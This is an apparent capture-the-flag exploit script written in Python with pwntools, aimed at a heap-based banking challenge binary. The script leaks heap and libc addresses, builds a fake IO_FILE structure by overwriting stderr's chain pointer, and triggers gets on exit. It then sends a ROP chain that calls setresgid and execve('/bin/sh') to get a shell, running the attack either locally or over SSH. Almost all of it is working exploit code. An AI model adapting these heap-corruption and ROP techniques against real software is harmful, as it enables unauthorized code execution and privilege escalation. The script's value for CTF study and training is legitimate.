#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "shell.angstromctf.com"
USER = "team422720"
PW = "XXXXXXXXXXXX"

def store(size, shortdesc, longdesc, owner):
  r.sendline("s")
  r.sendlineafter(": ", size)
  r.sendlineafter(": ", shortdesc)
  r.sendlineafter(": ", longdesc)
  r.sendlineafter(": ", owner)
  r.recvuntil(">")

def store2(size, shortdesc, longdesc, owner):
  r.sendline("s")
  r.sendlineafter(": ", size)
  r.sendafter(": ", shortdesc)
  r.sendafter(": ", longdesc)
  r.sendafter(": ", owner)
  r.recvuntil(">")

def retrieve(idx):
  r.sendline("r")
  r.sendlineafter(": ", str(idx))
  r.recvuntil(">")

def check(num, words, rec, addr, note):
  r.sendline("c")
  r.sendlineafter(": ", num)
  r.sendlineafter(": ", words)
  r.sendlineafter(": ", rec)
  r.sendlineafter(": ", addr)
  r.sendafter(": ", note)
  r.recvuntil(">")  

def enumerate():
  r.sendline("e")
  r.recvline()
  r.recvline()

  DATA = r.recvuntil("> ", drop=True)
  return DATA.split("\n")

def exploit(r):
  USERNAME = "Z"*8+p8(0x31)
  PW = "CCCCDDDD"

  r.sendlineafter("username: ", USERNAME)
  r.sendlineafter("password: ", PW)

  r.recvuntil(">")
  payload = "D"*24+p8(0xa1) 
  
  log.info("Create initial chunks")

  store("1000.0", "A"*8, "1"*8, "A1"*8) # 0
  store("1000.0", "B"*8, "2"*8, "B1"*8) # 1
  store("1000.0", "C"*8, "3"*8, "C1"*8) # 2
  store("1000.0", "D"*8, "4"*8, "D1"*8) # 3
  store("1000.0", "E"*8, "5"*8, "E1"*8) # 3
  
  log.info("Free some chunks to fill unsorted bin list")

  retrieve(3)
  retrieve(1)
  
  log.info("Create chunk (free it before filling to get a leak on FD/BK)")  
  store("6000.0", "", "A"*30, "B"*30)

  log.info("Leak heap address via chunk 3")

  HEAPLEAK = u64(enumerate()[3].split(": ")[1].split(" ")[0].strip().ljust(8, "\x00"))

  log.info("Store another chunk to get main_arena ptr into freed chunk")
  store("100.0", "F"*8, "6"*8, "F1"*8)

  log.info("Leak LIBC via chunk 3")
  LIBCLEAK = u64(enumerate()[3].split(": ")[1].split(" ")[0].strip().ljust(8, "\x00"))

  log.info("HEAPLEAK         : %s" % hex(HEAPLEAK))
  log.info("LIBCLEAK         : %s" % hex(LIBCLEAK))
  
  libc.address = LIBCLEAK - 0x3c4c08

  log.info("Overwrite next ptr in chunk with ptr to chain ptr of stderr") 

  payload = "E"*20  
  payload += p64(LIBCLEAK-0x2c0-0x84)[:7]   # address of stderr._chain

  check("200.0", "A"*30, "B"*30, "D"*30, payload)

  log.info("Overwrite chain ptr in stderr with ptr to next stored chunk (and fill with IO_file struct)")
  
  libc.address = LIBCLEAK - 0x3c4c08
  
  # mov rdi, rsp, call qword ptr [rax+0x20h]
  CALLGETS = libc.address + 0x12b86b    
  RET = libc.address + 0xae876    # ret
    
  payload1 = p64(0) + p64(0)
  payload1 += p64(0) + p64(0)[:7]
  
  payload2 =  p64(0) + p64(RET)
  payload2 += p64(0) + p64(0)
  payload2 += p64(0) + p64(0) 
  payload2 += p64(8) + p64(CALLGETS)[:7]  
  
  payload3 = p64(libc.symbols["gets"]) + p64(0)       # next chain
  payload3 += p64(0x0) + p64(0xffffffffffffffff)[:7]
    
  store2("100.0", payload1, payload2, payload3)
  
  payload1 = p64(0) + p64(0)
  payload1 += p64(0) + p64(0)
      
  payload2 = p64(0) + p64(0)
  payload2 += p64(0)[:7] + p64(HEAPLEAK + 0x328-0x18)   # vtable
  payload2 += "C"*(64-len(payload2))
  
  store2("100.0", payload1, payload2, payload3)

  log.info("Exit will trigger our fake IO_file => gets(rsp)")

  r.sendline("5")
  r.sendline()

  log.info("Send ropchain (setresgid + execve)")

  POPRAX = libc.address + 0x0000000000033544
  POPRDI = libc.address + 0x0000000000021102
  POPRSI = libc.address + 0x00000000000202e8
  POPRDX = libc.address + 0x0000000000001b92
  SYSCALL = libc.address + 0x00000000000bc375

  payload = "A"*8
  payload += p64(HEAPLEAK + 0x2f8 - 0x38)   # gets called (ret)  
  payload += p64(0xdeadbeef)*5

  # setresgid
  payload += p64(POPRAX)
  payload += p64(119)
  payload += p64(POPRDI)
  payload += p64(1011)
  payload += p64(POPRSI)
  payload += p64(1011)
  payload += p64(POPRDX)
  payload += p64(1011)
  payload += p64(SYSCALL)

  # execve("/bin/sh")
  payload += p64(POPRAX)
  payload += p64(59)
  payload += p64(POPRDI)
  payload += p64(next(libc.search("/bin/sh")))
  payload += p64(POPRSI)
  payload += p64(0)
  payload += p64(POPRDX)
  payload += p64(0)
  payload += p64(SYSCALL)

  r.sendline(payload)
  r.sendline()
    
  r.interactive()
  
  return

if __name__ == "__main__":
  e = ELF("./bank_roppery")
  libc = ELF("./libc.so.6")
  
  if len(sys.argv) > 1:
    LOCAL = False
    session = ssh(USER, HOST, password=PW)
    session.run("rm .account")
    session.run("rm .password")
    session.run("rm -rf ZZZZZZZZ1")
    r = session.process(["./bank_roppery"])
    exploit(r)
  else:
    LOCAL = True
    os.system("rm .account")
    os.system("rm .password")
    os.system("rm -rf ZZZZZZZZ1")
    r = process(["./bank_roppery"], env={"LD_PRELOAD":"./libc.so.6"})
    print util.proc.pidof(r)
    pause()
    exploit(r)